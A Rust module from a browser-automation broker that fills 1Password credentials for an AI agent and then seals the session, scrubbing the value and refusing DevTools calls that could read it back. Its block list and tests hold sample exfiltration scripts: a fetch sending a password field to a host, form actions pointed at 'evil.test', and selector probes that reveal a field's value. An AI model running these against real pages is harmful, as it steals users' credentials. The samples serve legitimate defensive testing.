//! Credential sessions: everything about filling logins lives here, behind three seams the rest of the broker calls.
//! - [`fill_credential`]: the broker's entry point for an agent's `fill_credential`.
//! - [`refusal`]: the proxy asks it, for each of the driver's commands, whether a session that filled a credential
//!   refuses it.
//! - [`outgoing`]: the proxy passes each message for the driver through it.
//!
//! A fill reads the reference with the session's vault (onepassword.rs: the project's `OP_SERVICE_ACCOUNT_TOKEN`, else
//! its person's, a cache per session, backoff on rate limits), checks that the page and the field's form are on the item's own
//! website, seals the session (its scrubber learns the value, agent-browser's policy file denies its reads, and the
//! proxy runs only agent-browser's own script shapes and refuses the rest, [`sealed_refusal`] and shapes.rs), then
//! types the value over the node's own connection and submits, in one step ([`fill`]). The value never passes the
//! proxy, and every answer to the driver is scrubbed of it.
use std::collections::HashMap;
use std::sync::atomic::Ordering;
use std::sync::{Arc, Mutex};
use std::time::Instant;

use fleetd_contracts::browser::{
    BrowserCallResult, BrowserControl, BrowserSessionState, FillCredentialCall, Filled,
};
use fleetd_contracts::mcp::{ErrorCode, McpToolError};
use serde_json::{Value, json};
use zeroize::Zeroizing;

use super::onepassword::{self, Cache, TOKEN_ENV, Vault, VaultFor};
use super::session::{PAUSED, Session};
use super::shapes::{self, Kind};
use super::{Broker, agent_browser, lock, refuse};
use crate::node::mask::Secrets;

/// The broker's side of 1Password: how a session's vault is made, and each live session's vault and cache.
pub struct Credentials {
    vault_for: Mutex<VaultFor>,
    /// By browser session id: its vault, made with the token at its first fill, and what it resolved.
    sessions: Mutex<HashMap<String, Arc<SessionVault>>>,
    /// By agent session: every value filled into its browsers, until its claude exits.
    filled: Mutex<HashMap<String, Secrets>>,
}

pub(super) struct SessionVault {
    pub(super) vault: Arc<dyn Vault>,
    cache: Cache,
}

impl Credentials {
    pub fn new(home: &std::path::Path) -> Self {
        Self {
            vault_for: Mutex::new(onepassword::vault_for(home)),
            sessions: Mutex::default(),
            filled: Mutex::default(),
        }
    }

    pub(super) fn filled(&self, thread: &str, reference: &str, value: &str) {
        let mut filled = lock(&self.filled);
        let values = filled.entry(thread.to_owned()).or_default();
        if !values.0.iter().any(|(_, v)| v == value) {
            values.0.push((reference.to_owned(), value.to_owned()));
        }
    }

    /// See [`SessionHooks::filled_since`](super::SessionHooks::filled_since).
    pub fn filled_since(&self, thread: &str, known: usize) -> Option<Secrets> {
        let filled = lock(&self.filled);
        let values = filled.get(thread).filter(|v| v.0.len() > known)?;
        Some(Secrets(values.0.clone()))
    }

    /// The agent session's claude exited: what it filled is let go.
    pub fn ended(&self, thread: &str) {
        lock(&self.filled).remove(thread);
    }

    /// A session ended: its vault (the helper process with the token) and cache go.
    pub fn forget(&self, session: &str) {
        lock(&self.sessions).remove(session);
    }
}

impl Broker {
    /// Vaults from `vault_for` instead of 1Password (tests: a fake vault).
    pub fn set_vaults(&self, vault_for: VaultFor) {
        *lock(&self.credentials.vault_for) = vault_for;
    }

    /// The session's vault: the one made at its first fill, or a new one with the token from its secrets.
    pub(super) async fn vault(&self, session: &Session) -> Result<Arc<SessionVault>, McpToolError> {
        self.vault_by(session.id.to_string(), session.thread.clone())
            .await
    }

    /// A vault kept under `id`, with the token from agent session `thread`'s secrets.
    async fn vault_by(
        &self,
        id: String,
        thread: String,
    ) -> Result<Arc<SessionVault>, McpToolError> {
        if let Some(vault) = lock(&self.credentials.sessions).get(&id) {
            return Ok(vault.clone());
        }
        let secrets_for = self.secrets_for.clone();
        let token = tokio::task::spawn_blocking(move || {
            let secrets = secrets_for(&thread)?;
            Ok::<_, String>(
                secrets
                    .0
                    .iter()
                    .find(|(name, _)| name == TOKEN_ENV)
                    .map(|(_, value)| Zeroizing::new(value.clone())),
            )
        })
        .await
        .map_err(|e| e.to_string())
        .and_then(|t| t)
        .map_err(|why| {
            refuse(
                ErrorCode::Failed,
                format!("The node could not read this session's secrets for its 1Password token ({why})."),
                "try again; if it keeps failing, check the node's log",
            )
        })?
        .filter(|token| !token.trim().is_empty())
        .ok_or_else(|| {
            refuse(
                ErrorCode::Failed,
                format!("There is no 1Password service account token for this work ({TOKEN_ENV})."),
                "ask your lead: the person whose order this is saves a service account token that can read the \
                 item's vault in the app's Settings › Your accounts › 1Password, or a person enters one with \
                 request_secret as a project or order variable",
            )
        })?;
        let vault = Arc::new(SessionVault {
            vault: (lock(&self.credentials.vault_for))(token),
            cache: Cache::default(),
        });
        Ok(lock(&self.credentials.sessions)
            .entry(id)
            .or_insert(vault)
            .clone())
    }
}

/// The vault key of an agent session whose browser runs on another machine.
fn remote_vault(thread: &str) -> String {
    format!("remote:{thread}")
}

impl Broker {
    /// A reference read from this machine's 1Password, with the token from agent session `thread`'s secrets, for its
    /// session whose browser runs on another machine: only the value goes there (sealed), never the token.
    pub async fn resolve_credential(
        &self,
        thread: &str,
        reference: &str,
    ) -> Result<onepassword::Credential, McpToolError> {
        let vault = self
            .vault_by(remote_vault(thread), thread.to_owned())
            .await?;
        vault
            .cache
            .get(vault.vault.as_ref(), reference)
            .await
            .map_err(|e| unread(reference, e))
    }

    /// Lets go of the vault an agent session's remote browser filled from.
    pub fn forget_remote_vault(&self, thread: &str) {
        self.credentials.forget(&remote_vault(thread));
    }
}

fn unread(reference: &str, e: onepassword::CredError) -> McpToolError {
    let fix = if e.rate_limited {
        "try again in a few minutes, once; don't retry in a loop: every machine shares the token's quota"
    } else {
        "check the reference (1Password's Copy Secret Reference gives it) and that the service account can read its \
         vault; else ask your lead"
    };
    refuse(
        ErrorCode::Failed,
        format!(
            "{reference} was not read: {}.",
            e.message.trim_end_matches('.')
        ),
        fix,
    )
}

/// An agent's `fill_credential` in its live session.
pub async fn fill_credential(
    broker: &Arc<Broker>,
    thread: &str,
    call: FillCredentialCall,
) -> Result<BrowserCallResult, McpToolError> {
    fill_from(broker, thread, call, None).await
}

/// `fill_credential` with the value the agent's machine read from its 1Password (`given`) for a session hosted here,
/// or else read here; either way only into the item's own sites, and sealed from the driver's reads after it.
pub async fn fill_from(
    broker: &Arc<Broker>,
    thread: &str,
    call: FillCredentialCall,
    given: Option<onepassword::Credential>,
) -> Result<BrowserCallResult, McpToolError> {
    let started = Instant::now();
    let reference = call.reference.to_string();
    let target = call.target.to_string();
    let submit = call.submit != Some(false);
    let session = broker.live(thread).ok_or_else(|| {
        refuse(
            ErrorCode::NotFound,
            "No browser session is open.",
            "start one with session_start, open the site's login page, then fill",
        )
    })?;
    if session.control() == BrowserControl::Human {
        return Err(refuse(
            ErrorCode::Invalid,
            PAUSED,
            "fill once they hand it back",
        ));
    }
    let args = json!({ "ref": reference, "target": target, "submit": submit });
    let failed = |error: McpToolError| {
        let error = scrubbed(&session, error);
        session.step(
            "fill_credential",
            args.clone(),
            false,
            Some(&error.message),
            started.elapsed().as_millis() as u64,
        );
        error
    };
    let credential = match given {
        Some(credential) => credential,
        None => {
            let vault = broker.vault(&session).await.map_err(failed)?;
            vault
                .cache
                .get(vault.vault.as_ref(), &reference)
                .await
                .map_err(|e| failed(unread(&reference, e)))?
        }
    };
    let sites: Vec<String> = credential
        .urls
        .iter()
        .filter_map(|u| onepassword::host_of(u))
        .collect();
    if sites.is_empty() {
        return Err(failed(refuse(
            ErrorCode::Forbidden,
            format!("The 1Password item of {reference} has no website, so it fills nowhere."),
            "ask your lead: a person must add the login page's address to the item in 1Password",
        )));
    }
    let allowed = |url: &str| onepassword::origin_allowed(url, &credential.urls);
    let page = page_url(&session).await.unwrap_or_default();
    if !allowed(&page) {
        return Err(failed(refuse(
            ErrorCode::Forbidden,
            format!(
                "{reference} is for {}; this page is on {}.",
                sites.join(", "),
                onepassword::host_of(&page).unwrap_or_else(|| "no website".to_owned())
            ),
            "open the item's own login page first, then fill",
        )));
    }
    // Sealed before the value is anywhere near the page: from here every answer to the driver is scrubbed of it, and
    // its reads are refused.
    session.add_secret(&reference, &credential.value);
    broker
        .credentials
        .filled(thread, &reference, &credential.value);
    session.credentials_filled.fetch_add(1, Ordering::Relaxed);
    if let Err(e) = agent_browser::write_policy(&broker.home, thread, true) {
        tracing::warn!(session = %session.id, error = %e, "agent-browser's sealed policy not written");
    }
    let otp = onepassword::is_otp(&reference);
    if let Err(e) = fill(&session, &target, &credential.value, submit, &allowed).await {
        if !e.typed {
            session.credentials_filled.fetch_sub(1, Ordering::Relaxed);
        }
        return Err(failed(refuse(
            ErrorCode::Invalid,
            format!("{target} was not filled: {}.", e.message),
            "check the selector with agent-browser snapshot -i; fill a text or password field of the item's own \
             login form",
        )));
    }
    let message = format!(
        "Filled {target} from {reference}{}{}. This browser session now refuses reading filled values back \
         (agent-browser eval and get value among them) and runs only agent-browser's own scripts; snapshots, clicks, \
         typing and scrolling work as before.",
        if otp { " (a one-time code)" } else { "" },
        if submit {
            " and submitted its form"
        } else {
            ""
        },
    );
    let seq = session.step(
        "fill_credential",
        args,
        true,
        Some(&message),
        started.elapsed().as_millis() as u64,
    );
    session.write_meta(None);
    broker.report(&session, BrowserSessionState::Live);
    // The page as the fill left it; the agent's next command records the one its submit loads.
    session.queue_capture(seq, None);
    Ok(BrowserCallResult::FillCredential(Filled {
        message: session.scrub().text(&message),
    }))
}

/// An error with every value the session knows scrubbed from it.
fn scrubbed(session: &Session, mut error: McpToolError) -> McpToolError {
    let scrub = session.scrub();
    error.message = scrub.text(&error.message);
    error.fix = error.fix.map(|fix| scrub.text(&fix));
    error
}

/// Whether the session filled a credential: from then on it is sealed.
pub fn sealed(session: &Session) -> bool {
    session
        .credentials_filled
        .load(std::sync::atomic::Ordering::Relaxed)
        > 0
}

/// Why the session refuses the driver's `method`, once it filled a credential; None lets it through.
pub fn refusal(session: &Session, method: &str, params: &Value) -> Option<String> {
    if !sealed(session) {
        return None;
    }
    sealed_refusal(method, params)
}

/// A message from the browser on its way to the driver: once the session filled a credential, every form of it
/// (literal, escaped, encoded) is scrubbed first.
pub fn outgoing(session: &Session, message: Value) -> Value {
    if !sealed(session) {
        return message;
    }
    let mut message = message;
    session.scrub().value(&mut message);
    for nodes in ["/result/nodes", "/params/nodes"] {
        if let Some(nodes) = message.pointer_mut(nodes).and_then(Value::as_array_mut) {
            redact_filled(session, nodes);
        }
    }
    message
}

/// What an accessibility tree (agent-browser's snapshots) says of a field the session filled: never its value, nor the
/// text inside it, whatever the value's length.
fn redact_filled(session: &Session, nodes: &mut [Value]) {
    let filled = |n: &Value| {
        n["backendDOMNodeId"]
            .as_i64()
            .is_some_and(|b| session.is_filled_field(b))
    };
    let fields: std::collections::HashSet<String> = nodes
        .iter()
        .filter(|n| filled(n))
        .filter_map(|n| n["nodeId"].as_str().map(str::to_owned))
        .collect();
    if fields.is_empty() {
        return;
    }
    // Everything under a filled field: its text, however deep.
    let mut inside = std::collections::HashSet::new();
    loop {
        let before = inside.len();
        for n in nodes.iter() {
            if n["parentId"]
                .as_str()
                .is_some_and(|p| fields.contains(p) || inside.contains(p))
                && let Some(id) = n["nodeId"].as_str()
            {
                inside.insert(id.to_owned());
            }
        }
        if inside.len() == before {
            break;
        }
    }
    for n in nodes.iter_mut() {
        let id = n["nodeId"].as_str().unwrap_or_default().to_owned();
        let keys: &[&str] = if fields.contains(&id) {
            &["value"]
        } else if inside.contains(&id) {
            &["value", "name"]
        } else {
            continue;
        };
        for key in keys {
            if n[*key].is_object() {
                n[*key]["value"] = "***filled***".into();
            }
        }
    }
}

/// The page the session follows, as its target says.
pub async fn page_url(session: &Session) -> Option<String> {
    let (target, _) = session.page()?;
    let info = session
        .cdp
        .call(None, "Target.getTargetInfo", json!({ "targetId": target }))
        .await
        .ok()?;
    info.pointer("/targetInfo/url")
        .and_then(Value::as_str)
        .map(str::to_owned)
}

/// Why a fill failed, and whether any of the value may have reached the page by then.
#[derive(Debug)]
pub struct FillError {
    pub message: String,
    pub typed: bool,
}

/// What the node reads of the field before it types: whether it takes text, its type, its document's address and its
/// form's.
const FIELD: &str = "function() { \
     const tag = this.tagName.toLowerCase(); const type = (this.type || '').toLowerCase(); \
     const field = tag === 'textarea' || (tag === 'input' && \
       !['hidden','checkbox','radio','submit','button','file','image','reset','color','range'].includes(type)); \
     return { field, type, url: this.ownerDocument.location.href, action: this.form ? this.form.action : '' }; }";

/// Hides what is typed in a field that isn't a password field (a one-time code, a username) from the video and the
/// live view: dots, as a password field shows, and blurred.
const HIDE: &str = "function() { \
     this.style.setProperty('-webkit-text-security', 'disc', 'important'); \
     this.style.setProperty('filter', 'blur(6px)', 'important'); }";

const FOCUS: &str = "function() { this.focus(); try { this.select(); } catch (e) {} }";

const SUBMIT: &str = "function() { const f = this.form; if (!f) return false; \
     if (f.requestSubmit) f.requestSubmit(); else f.submit(); return true; }";

/// Types `value` into the field `target` (a CSS selector) of the followed page over the node's own connection, then
/// submits its form (or presses Enter in it) when `submit`, so the value sits in the page as briefly as it can. The
/// field's document, and its form's address when it submits, must be `allowed`: checked here, just before typing, so
/// a page that moved since the caller looked gets nothing. The value never passes the proxy.
pub async fn fill(
    session: &Session,
    target: &str,
    value: &str,
    submit: bool,
    allowed: &(dyn Fn(&str) -> bool + Sync),
) -> Result<(), FillError> {
    let mut typed = false;
    let fail = |message: String, typed: bool| FillError { message, typed };
    let Some((_, page)) = session.page() else {
        return Err(fail("the browser has no page".into(), false));
    };
    let call = |method: &'static str, params: Value| session.cdp.call(Some(&page), method, params);
    let doc = call("DOM.getDocument", json!({ "depth": 0 }))
        .await
        .map_err(|e| fail(e, false))?;
    let root = doc.pointer("/root/nodeId").cloned().unwrap_or_default();
    let found = call(
        "DOM.querySelector",
        json!({ "nodeId": root, "selector": target }),
    )
    .await
    .map_err(|e| fail(e, false))?;
    let node = found["nodeId"].as_u64().unwrap_or(0);
    if node == 0 {
        return Err(fail(
            format!("no field on the page matches {target}"),
            false,
        ));
    }
    let described = call("DOM.describeNode", json!({ "nodeId": node }))
        .await
        .map_err(|e| fail(e, false))?;
    let backend = described
        .pointer("/node/backendNodeId")
        .and_then(Value::as_i64);
    let object = call("DOM.resolveNode", json!({ "nodeId": node }))
        .await
        .map_err(|e| fail(e, false))?;
    let object = object
        .pointer("/object/objectId")
        .cloned()
        .unwrap_or_default();
    let on = |function: &'static str| {
        call(
            "Runtime.callFunctionOn",
            json!({ "objectId": object, "functionDeclaration": function, "returnByValue": true }),
        )
    };
    let field = on(FIELD).await.map_err(|e| fail(e, false))?;
    let field = &field["result"]["value"];
    if field["field"] != true {
        return Err(fail(
            format!("{target} is not a text or password field"),
            false,
        ));
    }
    if !allowed(field["url"].as_str().unwrap_or_default()) {
        return Err(fail("the page left the item's website".into(), false));
    }
    let action = field["action"].as_str().unwrap_or_default();
    if submit && !action.is_empty() && !allowed(action) {
        return Err(fail(
            format!(
                "its form sends to {}, not to the item's website",
                super::onepassword::host_of(action).unwrap_or_else(|| "another address".into())
            ),
            false,
        ));
    }
    if field["type"] != "password" {
        on(HIDE).await.map_err(|e| fail(e, false))?;
    }
    // From here the driver may not write to this field (filled_field_refusal).
    if let Some(backend) = backend {
        session.filled_field(backend);
    }
    let typing = async {
        on(FOCUS).await?;
        typed = true;
        // The one copy of the value the node makes for the page, wiped once sent.
        session
            .cdp
            .call_secret(Some(&page), "Input.insertText", json!({ "text": value }))
            .await?;
        if submit {
            let submitted = on(SUBMIT).await?;
            if submitted.pointer("/result/value") != Some(&Value::Bool(true)) {
                for kind in ["keyDown", "keyUp"] {
                    let mut key = json!({ "type": kind, "key": "Enter", "code": "Enter", "windowsVirtualKeyCode": 13 });
                    if kind == "keyDown" {
                        key["text"] = "\r".into();
                    }
                    call("Input.dispatchKeyEvent", key).await?;
                }
            }
        }
        Ok::<(), String>(())
    };
    typing.await.map_err(|e| fail(e, typed))
}

/// DOM writes to one node, which a sealed session refuses on a field it filled.
const NODE_WRITES: &[&str] = &[
    "DOM.setAttributeValue",
    "DOM.removeAttribute",
    "DOM.setNodeValue",
    "DOM.setFileInputFiles",
];

/// Why a session that filled a credential refuses the driver's `command`, if it writes to a field it filled: whatever
/// the attribute, a write there could change how the field validates or shows. The node asks the browser, in the
/// driver's own session, which node the command names; when it can't tell (the browser errs, or the command names no
/// node), the write is refused too, and the agent may try again.
pub async fn filled_field_refusal(session: &Session, command: &Value) -> Option<String> {
    let method = command["method"].as_str().unwrap_or_default();
    if !sealed(session) || !NODE_WRITES.contains(&method) {
        return None;
    }
    let unknown = || {
        Some(format!(
            "{method} was refused: this browser session filled a login from 1Password, and the node couldn't tell \
             which element this write is for, so it didn't make it. Try again; if it keeps failing, look the element \
             up again (agent-browser snapshot -i)."
        ))
    };
    let params = &command["params"];
    let Some(node) = ["nodeId", "backendNodeId", "objectId"]
        .iter()
        .find(|key| !params[**key].is_null())
        .map(|key| json!({ *key: params[*key] }))
    else {
        return unknown();
    };
    let Some(backend) = session
        .cdp
        .call(command["sessionId"].as_str(), "DOM.describeNode", node)
        .await
        .ok()
        .and_then(|d| d.pointer("/node/backendNodeId").and_then(Value::as_i64))
    else {
        return unknown();
    };
    session.is_filled_field(backend).then(|| {
        format!(
            "{method} is off on this field: this browser session filled it from 1Password, and nothing may change \
             it until the session ends."
        )
    })
}

/// Methods a sealed session refuses outright: whole-page reads in encodings the scrubber can't see into (DOM snapshots
/// with input values, MHTML, PDF), request bodies, the hooks that run script of the driver's in every page or intercept
/// traffic, and DOM writes that could move a filled field, or what sends it, elsewhere.
const SEALED_METHODS: &[&str] = &[
    "DOMSnapshot.captureSnapshot",
    "DOMSnapshot.getSnapshot",
    "Page.captureSnapshot",
    "Page.printToPDF",
    "Network.getRequestPostData",
    "Page.addScriptToEvaluateOnNewDocument",
    "Page.setDocumentContent",
    "Runtime.addBinding",
    "Target.exposeDevToolsProtocol",
    "Runtime.queryObjects",
    "HeapProfiler.takeHeapSnapshot",
    "Network.setRequestInterception",
    "Browser.grantPermissions",
    "Browser.setPermission",
    "CSS.setStyleTexts",
    "DOM.setOuterHTML",
    "DOM.setAttributesAsText",
    "DOM.setNodeName",
    "DOM.moveTo",
    "DOM.copyTo",
    // Searches by selector or XPath, and style rules the page then applies: both could test a field's state.
    "DOM.performSearch",
    "CSS.addRule",
    "CSS.createStyleSheet",
    "CSS.forcePseudoState",
];

/// Why a session that filled a credential refuses `method`, if it does. Every answer it lets through is scrubbed of
/// the value's forms ([`outgoing`]); these are what could carry it in another, or off the page.
pub fn sealed_refusal(method: &str, params: &Value) -> Option<String> {
    let sealed = || {
        Some(format!(
            "{method} is off in this browser session: it filled a login from 1Password, and nothing may read that \
             value back or send it elsewhere. Use snapshots, clicks and typing; start a new session for anything else."
        ))
    };
    // The debugger runs code of its own (breakpoint conditions, edited sources) and interception rewrites traffic; a
    // reload may carry a script to run.
    if SEALED_METHODS.contains(&method)
        || method.starts_with("Debugger.")
        || method.starts_with("Fetch.")
        || method.starts_with("CSS.set")
        || (method == "Page.reload" && !params["scriptToEvaluateOnLoad"].is_null())
    {
        return sealed();
    }
    if matches!(method, "DOM.setAttributeValue" | "DOM.removeAttribute") {
        let name = params["name"].as_str().unwrap_or_default();
        return shapes::sink_attribute(name).then(|| {
            format!(
                "{method} {name} is off in this browser session: it filled a login from 1Password, and changing \
                 where a form sends, what a page loads, its handlers, how a field shows or how it validates could \
                 carry that value elsewhere or tell it."
            )
        });
    }
    if matches!(method, "DOM.querySelector" | "DOM.querySelectorAll") {
        let selector = params["selector"].as_str().unwrap_or_default();
        return shapes::revealing_selector(selector).map(|part| {
            format!(
                "{method} with {part} is off in this browser session: it filled a login from 1Password, and a \
                 field's state ({part}) could tell that value one guess at a time. Select by id, name, role or text."
            )
        });
    }
    let (script, kind) = match method {
        "Runtime.evaluate" | "Runtime.compileScript" => {
            (params["expression"].as_str(), Kind::Script)
        }
        "Runtime.callFunctionOn" => (params["functionDeclaration"].as_str(), Kind::Function),
        "Page.navigate" | "Target.createTarget" => {
            let url = params["url"].as_str().unwrap_or_default();
            return url
                .trim_start()
                .to_ascii_lowercase()
                .starts_with("javascript:")
                .then(sealed)?;
        }
        _ => return None,
    };
    let why = shapes::refusal(script.unwrap_or_default(), kind)?;
    Some(format!(
        "This script is refused: this browser session filled a login from 1Password, so it runs only agent-browser's \
         own scripts, and {why}. Use agent-browser's snapshot, get, click, fill and scroll; start a new session for \
         anything else."
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_sealed_session_runs_agent_browsers_own_scripts_and_refuses_the_rest() {
        let script = |expression: &str| json!({ "expression": expression });
        let function = |declaration: &str| json!({ "functionDeclaration": declaration });
        for (method, params) in [
            ("Runtime.evaluate", script("document.title")),
            (
                "Runtime.evaluate",
                script("document.querySelectorAll('input').length"),
            ),
            (
                "Runtime.callFunctionOn",
                function(
                    "function() { this.scrollIntoView({ block: 'center', inline: 'nearest' }); }",
                ),
            ),
            (
                "Runtime.callFunctionOn",
                function("function() { return this.getAttribute('href'); }"),
            ),
            (
                "DOM.setAttributeValue",
                json!({ "name": "data-x", "value": "1" }),
            ),
            (
                "Page.navigate",
                json!({ "url": "https://shop.example.test/" }),
            ),
            ("Page.reload", json!({})),
            ("Input.insertText", json!({ "text": "hello" })),
            (
                "DOM.querySelectorAll",
                json!({ "selector": "input[type=password]" }),
            ),
        ] {
            assert_eq!(sealed_refusal(method, &params), None, "{method} {params}");
        }
        for (method, params, says) in [
            (
                "Runtime.evaluate",
                script("btoa(document.querySelector('#pw').value)"),
                "not one of agent-browser 0.39.4's own scripts",
            ),
            (
                "Runtime.callFunctionOn",
                function("function() { return this.value; }"),
                "not one of agent-browser 0.39.4's own scripts",
            ),
            (
                "Runtime.compileScript",
                script("fetch('//x?' + document.forms[0].pw.value)"),
                "not one of agent-browser 0.39.4's own scripts",
            ),
            (
                "Runtime.evaluate",
                script("document.title +"),
                "not a script fleetd can read",
            ),
            (
                "Runtime.evaluate",
                script(
                    "(() => { const el = document.querySelector('form'); \
                     if (el) { el.setAttribute('onsubmit', 'x()'); return false; } return false; })()",
                ),
                "it changes the onsubmit attribute",
            ),
            (
                "Runtime.evaluate",
                script("document.querySelector('#pw')?.removeAttribute('type')"),
                "it changes the type attribute",
            ),
            (
                "DOM.setAttributeValue",
                json!({ "name": "Action", "value": "https://evil.test/" }),
                "DOM.setAttributeValue Action is off",
            ),
            (
                "DOM.removeAttribute",
                json!({ "name": "style" }),
                "DOM.removeAttribute style is off",
            ),
            (
                "DOM.setAttributeValue",
                json!({ "name": "pattern", "value": "P.*" }),
                "how it validates",
            ),
            (
                "DOM.querySelectorAll",
                json!({ "selector": "input:INVALID" }),
                "a field's state (:invalid)",
            ),
            (
                "DOM.querySelector",
                json!({ "selector": "input[value^=P]" }),
                "a field's state ([value)",
            ),
            (
                "Runtime.evaluate",
                script("document.querySelectorAll('#pw:valid').length"),
                "it queries a field's state (:valid)",
            ),
            (
                "Runtime.evaluate",
                script("document.querySelectorAll(`input\\x3ainvalid`).length"),
                "it queries a field's state (:invalid)",
            ),
            (
                "Runtime.evaluate",
                script(
                    "(() => { const el = document.querySelector('#pw'); \
                     if (el) { el.setAttribute('form', 'away'); return false; } return false; })()",
                ),
                "it changes the form attribute",
            ),
            (
                "DOM.setAttributeValue",
                json!({ "name": "formaction", "value": "https://evil.test/" }),
                "DOM.setAttributeValue formaction is off",
            ),
            (
                "DOM.setAttributeValue",
                json!({ "name": "method", "value": "get" }),
                "DOM.setAttributeValue method is off",
            ),
            (
                "DOM.setAttributeValue",
                json!({ "name": "target", "value": "_blank" }),
                "DOM.setAttributeValue target is off",
            ),
            (
                "DOM.removeAttribute",
                json!({ "name": "enctype" }),
                "DOM.removeAttribute enctype is off",
            ),
            (
                "Runtime.evaluate",
                script(
                    "(() => { const el = document.querySelector('form'); \
                     if (el) { el.setAttribute('method', 'get'); return false; } return false; })()",
                ),
                "it changes the method attribute",
            ),
            ("DOM.performSearch", json!({}), "DOM.performSearch is off"),
            ("CSS.addRule", json!({}), "CSS.addRule is off"),
            (
                "CSS.setStyleSheetText",
                json!({}),
                "CSS.setStyleSheetText is off",
            ),
            ("DOM.setOuterHTML", json!({}), "DOM.setOuterHTML is off"),
            ("DOM.moveTo", json!({}), "DOM.moveTo is off"),
            (
                "Debugger.setBreakpointByUrl",
                json!({ "condition": "x()" }),
                "Debugger.setBreakpointByUrl is off",
            ),
            (
                "Fetch.continueRequest",
                json!({}),
                "Fetch.continueRequest is off",
            ),
            (
                "Page.reload",
                json!({ "scriptToEvaluateOnLoad": "x()" }),
                "Page.reload is off",
            ),
            (
                "Page.navigate",
                json!({ "url": " JavaScript:alert(1)" }),
                "Page.navigate is off",
            ),
        ] {
            let why = sealed_refusal(method, &params).unwrap_or_default();
            assert!(
                why.contains(says) && why.contains("filled a login from 1Password"),
                "{method} {params}: {why}"
            );
        }
    }
}
